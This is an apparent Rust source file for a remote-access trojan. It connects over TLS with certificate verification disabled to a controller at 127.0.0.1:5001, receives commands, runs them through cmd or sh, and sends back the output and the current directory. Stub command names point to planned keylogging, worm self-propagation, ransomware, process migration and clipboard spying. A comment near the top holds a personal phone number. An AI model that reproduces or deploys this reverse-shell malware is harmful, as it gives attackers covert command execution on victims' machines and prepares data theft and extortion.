/*use std::process::Command;

fn main() {
    //executes process via cmd in the same process context with .output
    if let Ok(command) = Command::new("cmd").arg("/c").arg("dir").output() {
        println!("{}",String::from_utf8_lossy(&command.stdout))
    }
    //Spawns a new process with .spawn
    Command::new("notepad").spawn();
}*/


use core::time;
use std::{net, fs};
use std::net::{Ipv4Addr, TcpStream, SocketAddr};
use std::str;
use std::thread;
use std::path::Path;
use openssl::ssl::{SslMethod, SslConnector};
use std::ffi::OsStr;
use std::env;
use openssl::ssl::SslStream;
//06.71.88.26.89 --directrice SESAD



use std::io::{Read,stdin, stdout, Write};
use std::process::{Child, Command, Stdio};
fn CurrentDir() ->String{
    let cwd = env::current_dir().unwrap();
    let my_cwd = cwd.into_os_string().into_string().unwrap();
    return my_cwd;
}

fn Mind_ReaderSectioid( MindtoRead:&str) -> Vec<u8>  {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
                .args(["/C", MindtoRead])
                .output()
                .expect("failed to execute process")
    } else {
        Command::new("sh")
                .arg("-c")
                .arg(MindtoRead)
                .output()
                .expect("failed to execute process")
    };
    
    return output.stdout;
}


fn main_2() {
    let mut build = SslConnector::builder(SslMethod::tls()).unwrap();
    build.set_verify(openssl::ssl::SslVerifyMode::NONE);
    let connector = build.build();
	let addr = Ipv4Addr::new(127,0,0,1);
	let sockettest = SocketAddr::from((addr,5001));
	let convertsocket = sockettest.to_string();
	let convertip = addr.to_string();
    let stream = TcpStream::connect(&convertsocket).unwrap();
    let mut stream = connector.connect(&convertip,stream).unwrap();
    let mut Commander = [0 as u8; 524288];
        let cwd = env::current_dir().unwrap();
        let my_cwd = CurrentDir();          
        stream.write_all(my_cwd.as_bytes());

    loop {
        
        stream.write_all(CurrentDir().as_bytes());
        //print on severside the working directory

        // read the command
        stream.read(&mut Commander);
        //Converting Command ri a readable format
        let my_string = String::from_utf8_lossy(&Commander);
        let mut splitted = my_string.split("\r");
        let raw_command=splitted.next().unwrap();

        println!("raw_command is {:?}",raw_command);
        

        // read_line leaves a trailing newline, which trim removes
        // this needs to be peekable so we can determine when we are on the last command
        let mut commands = raw_command.trim().split(" | ").peekable();

       
        while let Some(command) = commands.next() {
            // everything after the first whitespace character is interpreted as args to the command
            println!("{:?}",command);
            let mut parts = command.trim().split_whitespace();
            if command.is_empty() {
                stream.write_all(b"Empty data");
            }else {
                
            let command = parts.next().unwrap();
            let args = parts;

            match command {
                "cd" => {
                    // default to '/' as new directory if one was not provided
                    let new_dir = args.peekable().peek().map_or("/", |x| *x);
                    let root = Path::new(new_dir);
                    if let Err(e) = env::set_current_dir(&root) {
                        eprintln!("{}", e);
                    }

                   
                }
                "ClippyON" => return,
                "ClippyOFF" => return,
                "CreapyON" => return,
                "CreapyOFF" => return,
                "Make_Self" => return,
                "KeySnipON" => return,
                "KeySnipOFF" => return,
                "WormSelf" => return,
                "RansomOnPOC" => return,
                "Migrate" => return,
                "EnableDebugPrivileges"=> {},
                "sleep15s" => {
                    let ten_millis = time::Duration::from_millis(15000);
                    thread::sleep(ten_millis);
                    stream.write_all(b"Sleep Finished");
                },
                command => {
                let mut Output= Mind_ReaderSectioid(command);
                let c: &[u8] =&Output;
                stream.write_all(c);

                }
            }
            }
            
            
        }
          
        

    

    }
}